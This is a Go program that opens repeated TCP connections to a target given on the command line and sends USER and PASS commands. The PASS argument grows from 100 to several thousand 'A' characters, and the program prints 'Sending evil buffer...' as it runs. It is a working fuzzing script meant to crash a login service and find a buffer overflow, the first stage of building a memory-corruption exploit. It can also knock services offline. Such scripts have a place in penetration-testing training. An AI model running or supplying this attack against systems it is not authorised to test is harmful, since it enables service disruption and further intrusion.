package main

import (
	"fmt"
	"net"
	"os"
)

func generateString(strLength int) string {
	var s string
	for i := 0; i < strLength; i++ {
		s += "A"
	}
	return s
}

func main() {
	dstHost := os.Args[1]
	port := os.Args[2]
	hostWithPort := fmt.Sprintf("%s:%s", dstHost, port)
	fmt.Println("\nSending evil buffer...", hostWithPort)

	counter := 100
	for i := 0; i < 30; i++ {
		s := generateString(counter)
		counter += 200

		conn, err := net.Dial("tcp", hostWithPort)
		if err != nil {
			panic(err)
		}

		var buf [1024]byte
		n, err := conn.Read(buf[0:])
		if err != nil {
			panic(err)
		}
		fmt.Println(string(buf[0:n]))

		_, err = conn.Write([]byte("USER test\r\n"))
		n, err = conn.Read(buf[0:])
		if err != nil {
			panic(err)
		}
		fmt.Println(string(buf[0:n]))

		fmt.Printf("Fuzzing PASS with %d bytes\r\n", len(s))
		passCmd := fmt.Sprintf("PASS %s\r\n", s)
		_, err = conn.Write([]byte(passCmd))
		n, err = conn.Read(buf[0:])
		if err != nil {
			panic(err)
		}
		fmt.Println(string(buf[0:n]))

		_, err = conn.Write([]byte("QUIT\r\n"))
		if err != nil {
			panic(err)
		}

		conn.Close()
	}
}
